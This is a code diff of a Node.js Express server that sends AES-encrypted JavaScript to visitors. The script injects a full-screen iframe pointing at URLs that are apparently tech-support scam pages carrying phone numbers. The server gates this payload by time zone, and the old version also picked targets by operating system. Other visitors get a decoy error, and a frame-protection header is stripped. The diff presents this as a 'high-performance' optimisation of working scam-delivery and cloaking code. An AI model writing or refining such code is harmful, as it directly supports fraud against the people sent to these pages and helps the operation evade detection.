@@ -10,137 +10,87 @@ const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
 app.use(cors());
 app.use(express.json());
 
-// Add CORS & Security Policy middleware
+// Optimized Security Headers Middleware
 app.use((req, res, next) => {
-    res.header("Access-Control-Allow-Origin", "*");
-    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
-    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
-    
-    // Modern way to handle frame permissions
-    const originalXFrameOptions = res.getHeader('X-Frame-Options');
-    if (originalXFrameOptions === 'sameorigin') {
-        res.removeHeader('X-Frame-Options');
-        res.setHeader('X-Frame-Options', 'ALLOW-FROM *');
-    }
-    next();
+    res.header("Access-Control-Allow-Origin", "*");
+    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
+    
+    if (res.getHeader('X-Frame-Options') === 'sameorigin') {
+        res.removeHeader('X-Frame-Options');
+    }
+    next();
 });
+
+// --- Static Data Configurations ---
+
+// O(1) Instant Lookup Set
+const ALLOWED_TIMEZONES = new Set([
+    "Asia/Tokyo"
+]);
+
+// Raw URLs accompanied by their selection probability weights (Must total 1.0)
+const RAW_CONFIGS = [
+    { url: "https://nanandikply1.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369", weight: 1.0 }
+
+];
+
+// --- Pre-Compilation Cache Layer ---
+// This processes everything into memory ONCE during boot, removing CPU load during requests.
+
+const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
+    const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${item.url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
+    
+    return {
+        weight: item.weight,
+        encryptedPayload: encodeURIComponent(CryptoJS.AES.encrypt(rawPayload, secretKey).toString())
+    };
+});
+
+// Pre-encrypt static error payload
+const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());
 
 // --- Helper Functions ---
 
-function aesEncode(text) {
-    return CryptoJS.AES.encrypt(text, secretKey).toString();
-}
+/**
+ * Returns a pre-encrypted payload immediately using constant-time evaluation 
+ * and simple random boundary checks.
+ */
+function getFastResponse() {
+    const rand = Math.random();
+    let cumulativeWeight = 0;
 
-function getError() {
-    const se1 = `console.log("Error Find");`;
-    const encrypted1 = aesEncode(se1);
-    return encodeURIComponent(encrypted1);
-}
-
-function getResponse(userAgent) {
-    // Detect if user is on macOS
-    const isMac = /Macintosh|Mac OS X/i.test(userAgent);
-
-    // Define your Groups with weights and OS-specific links
-    const linkGroups = [
-        {
-            id: "Group 1",
-            weight: 0.5,
-            macos: "https://main.d3o0q87efdh1wv.amplifyapp.com/m2a4c234rjnkeferf/index.html?Anph=0101-83366-64655",
-            others: "https://main.d3o0q87efdh1wv.amplifyapp.com/w2i4n234rjnkeferf/index.html?Anph=0101-83366-64655"
-        },
-        {
-            id: "Group 2",
-            weight: 0.5,
-            macos: "https://main.dmd46rtsqesma.amplifyapp.com/m2a4c234rjnkeferf/index.html?Anph=(050)-6864-8350",
-            others: "https://main.dmd46rtsqesma.amplifyapp.com/w2i4n234rjnkeferf/index.html?Anph=(050)-6864-8350"
-        }
-    ];
-
-    // 1. Pick the group based on weight (70/30)
-    function selectGroup() {
-        const rand = Math.random();
-        let cumulative = 0;
-        for (const group of linkGroups) {
-            cumulative += group.weight;
-            if (rand <= cumulative) {
-                return group;
-            }
-        }
-        return linkGroups[0]; // Fallback to first group
-    }
-
-    const selectedGroup = selectGroup();
-
-    // 2. Select URL within that group based on OS detection
-    const selectedUrl = isMac ? selectedGroup.macos : selectedGroup.others;
-
-    // 3. Build the JavaScript payload
-    const se1 = `
-        const iframe = document.createElement("iframe");
-        iframe.src = "${selectedUrl}";
-
-        // permissions
-        iframe.setAttribute(
-            "allow",
-            "fullscreen; autoplay; encrypted-media; picture-in-picture"
-        );
-
-        // fullscreen support
-        iframe.setAttribute("allowfullscreen", "");
-        iframe.setAttribute("webkitallowfullscreen", "");
-        iframe.setAttribute("mozallowfullscreen", "");
-
-        // sandbox
-        iframe.setAttribute(
-            "sandbox",
-            "allow-scripts allow-popups allow-forms allow-downloads"
-        );
-
-        // styles
-        iframe.style.width = "100%";
-        iframe.style.height = "100%";
-        iframe.style.border = "0px";
-
-        // add to page
-        const container = document.getElementById("contentiframe");
-        if(container) {
-            container.replaceChildren(iframe);
-        }
-    `;
-
-    return encodeURIComponent(aesEncode(se1));
+    for (const item of PRECOMPUTED_RESPONSES) {
+        cumulativeWeight += item.weight;
+        if (rand <= cumulativeWeight) {
+            return item.encryptedPayload;
+        }
+    }
+    return PRECOMPUTED_RESPONSES[PRECOMPUTED_RESPONSES.length - 1].encryptedPayload;
 }
 
 // --- Routes ---
 
 app.get("/timezone", (req, res) => {
-    res.status(401).json({
-        status: "error",
-        message: "Unauthorized access",
-        response: getError()
-    });
+    res.status(401).json({
+        status: "error",
+        message: "Unauthorized access",
+        response: ERROR_PAYLOAD
+    });
 });
 
 app.post("/timezone", (req, res) => {
-    const { timezone } = req.body;
-    const userAgent = req.get('User-Agent') || "";
+    const { timezone } = req.body;
 
-    const allowedTimezones = [
-        "Asia/Tokyo",
-        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Anchorage",
-        "Pacific/Honolulu",
-        "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
-    ];
-
-    if (allowedTimezones.includes(timezone)) {
-        res.send(getResponse(userAgent));
-    } else {
-        res.send(getError());
-    }
+    // Fast validations against memory references 
+    if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
+        res.send(getFastResponse());
+    } else {
+        res.send(ERROR_PAYLOAD);
+    }
 });
 
 // --- Start Server ---
 app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+    console.log(`High-performance server running on port ${PORT}`);
 });
